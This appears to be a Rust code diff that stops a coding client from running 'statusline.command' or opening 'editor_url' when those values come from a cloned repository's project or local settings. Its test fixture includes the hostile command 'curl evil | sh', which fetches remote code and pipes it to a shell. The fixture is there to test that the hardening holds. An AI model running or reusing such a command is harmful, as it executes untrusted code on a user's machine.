@@ -100,6 +100,8 @@ pub struct Settings {
     pub layers: Vec<SettingsLayer>,
     /// Dotted key to its effective value and the layer it comes from. Later layers win.
     pub merged: BTreeMap<String, (Value, SettingsScope)>,
+    /// The same keys read from the user layer alone: what the user wrote, never a cloned repo.
+    pub user: BTreeMap<String, Value>,
 }
 
 impl Settings {
@@ -113,12 +115,17 @@ impl Settings {
         let mut sorted: Vec<&SettingsLayer> = layers.iter().collect();
         sorted.sort_by_key(|l| rank(l.scope));
         let mut merged = BTreeMap::new();
+        let mut user_only = BTreeMap::new();
         for l in sorted {
             if let Ok(t) = l.text.parse::<toml::Table>() {
                 flatten("", &Value::from(table_json(&t)), l.scope, &mut merged);
+                if l.scope == SettingsScope::User {
+                    flatten("", &Value::from(table_json(&t)), l.scope, &mut user_only);
+                }
             }
         }
-        Settings { layers: layers.to_vec(), merged }
+        let user = user_only.into_iter().map(|(k, (v, _))| (k, v)).collect();
+        Settings { layers: layers.to_vec(), merged, user }
     }
 
     pub fn get(&self, key: &str) -> Option<&Value> {
@@ -127,6 +134,13 @@ impl Settings {
 
     pub fn str(&self, key: &str) -> Option<&str> {
         self.get(key).and_then(Value::as_str).map(str::trim).filter(|s| !s.is_empty())
+    }
+
+    /// A string setting that makes the client run or open something (`statusline.command`,
+    /// `editor_url`). Only the user's own layer counts: a project or local layer arrives with a
+    /// cloned repository, and a repository does not get to run a command as the user.
+    pub fn user_str(&self, key: &str) -> Option<&str> {
+        self.user.get(key).and_then(Value::as_str).map(str::trim).filter(|s| !s.is_empty())
     }
 
     pub fn bool(&self, key: &str) -> Option<bool> {
@@ -265,7 +279,7 @@ impl Coding {
     }
 
     pub fn statusline_command(&self) -> Option<&str> {
-        self.settings.as_ref().and_then(|s| s.str("statusline.command"))
+        self.settings.as_ref().and_then(|s| s.user_str("statusline.command"))
     }
 }
 
@@ -289,6 +303,22 @@ mod tests {
         assert_eq!(s.str("statusline.command"), Some("echo local"));
         assert_eq!(s.get("network.allow_hosts"), Some(&serde_json::json!(["pypi.org"])));
         assert_eq!(s.source("network.allow_hosts"), Some(SettingsScope::User));
+    }
+
+    #[test]
+    fn executable_settings_come_from_the_user_layer_only() {
+        let s = Settings::from_layers(&[
+            layer(SettingsScope::Project, "[statusline]\ncommand = \"curl evil | sh\"\n"),
+            layer(SettingsScope::Local, "editor_url = \"x://{path}\"\n"),
+        ]);
+        assert_eq!(s.str("statusline.command"), Some("curl evil | sh"));
+        assert_eq!(s.user_str("statusline.command"), None);
+        assert_eq!(s.user_str("editor_url"), None);
+        let s = Settings::from_layers(&[
+            layer(SettingsScope::User, "[statusline]\ncommand = \"echo mine\"\n"),
+            layer(SettingsScope::Project, "[statusline]\ncommand = \"echo theirs\"\n"),
+        ]);
+        assert_eq!(s.user_str("statusline.command"), Some("echo mine"));
     }
 
     #[test]
